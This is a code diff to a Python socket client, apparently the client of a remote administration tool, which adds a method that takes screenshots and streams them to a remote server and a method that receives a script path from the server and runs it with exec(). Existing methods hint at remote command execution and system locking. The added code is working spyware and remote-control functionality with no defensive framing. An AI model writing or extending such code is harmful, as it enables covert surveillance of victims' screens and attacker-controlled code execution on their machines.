@@ -6,6 +6,8 @@ import sys
 import time
 from pprint import pprint
 
+from mss import mss
+
 
 class Client:
     def __init__(self, server_ip, port, buffer_size, client_ip):
@@ -14,7 +16,7 @@ class Client:
         self.BUFFER_SIZE = buffer_size
         self.CLIENT_IP = client_ip
         # self.recvcounter = 0
-
+        self.sscount = 0
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def connectToServer(self):
@@ -46,7 +48,8 @@ class Client:
             self.confirmconnection()
         while True:
             input("Success - Reached the code loop")
-            self.sendHostInfo()
+            #self.sendHostInfo()
+            self.ssht()
 
     def runrun(self, msg):
         obj = "failed"
@@ -128,6 +131,29 @@ class Client:
             new.append(str(item.split("\r")[:-1]))
         for i in new:
             print(i[2:-2])
+
+    def exePy(self):
+        path2script = self.client.recv(self.BUFFER_SIZE).decode()
+
+        try:
+            exec(open(path2script).read())
+            self.client.send("SUCCESS".encode())
+        except:
+            self.client.send("FAILURE".encode())
+
+
+    def ssht(self):
+        ss = mss()
+        ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+        picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
+        self.client.send(str(picsize).encode())
+        time.sleep(0.1)
+        with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
+            tosend = screen.read()
+            self.client.send(tosend)  # sending actual file
+        # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
+        self.sscount += 1
+        print("SUCCESS")
 
     def locksystem(self):
         ## command = "-locksystem"
